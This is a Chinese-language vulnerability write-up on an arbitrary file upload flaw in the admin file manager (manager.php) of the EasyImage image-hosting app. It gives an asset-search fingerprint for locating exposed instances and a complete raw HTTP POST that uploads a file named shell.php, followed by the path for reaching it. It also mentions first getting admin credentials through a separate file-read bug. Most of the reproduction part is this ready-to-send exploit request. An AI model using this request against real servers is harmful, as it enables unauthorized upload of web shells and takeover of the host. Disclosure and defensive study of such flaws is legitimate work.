# EasyImage manager.php 后台任意文件上传漏洞

## 漏洞描述

EasyImage manager.php 存在任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件到服务器获取服务器权限

## 漏洞影响

```
EasyImage
```

## 网络测绘

```
app="EasyImage-简单图床"
```

## 漏洞复现

主页面

![image-20230417094210473](images/image-20230417094210473.png)

登陆后台后发送POC (通过任意文件读取获取账号密码)

```
POST /admin/manager.php?p= HTTP/1.1
Host: 
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cache-Control: no-cache
Content-Length: 1622
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEUCF9Yq83AkaO6sv
Cookie: Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680341989; auth=a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22tossone%22%3Bi%3A1%3Bs%3A32%3A%22590368bca375c2f8fe93df7d253481e8%22%3B%7D; Hm_lpvt_c790ac2bdc2f385757ecd0183206108d=1680342144; filemanager=sdeemhj3b9aeoretftrlijjh25
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36

------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name="dzuuid"

7e4fad9a-3545-4ed6-b655-b3e3a6b2978c
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name="dzchunkindex"

0
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name="dztotalfilesize"

583
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name="dzchunksize"

10000000
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name="dztotalchunkcount"

1
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name="dzchunkbyteoffset"

0
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name="p"


------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name="fullpath"

shell.php
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

234

------WebKitFormBoundaryEUCF9Yq83AkaO6sv--
```

![image-20230417094255974](images/image-20230417094255974.png)

上传访问地址为

```
/i/shell.php
```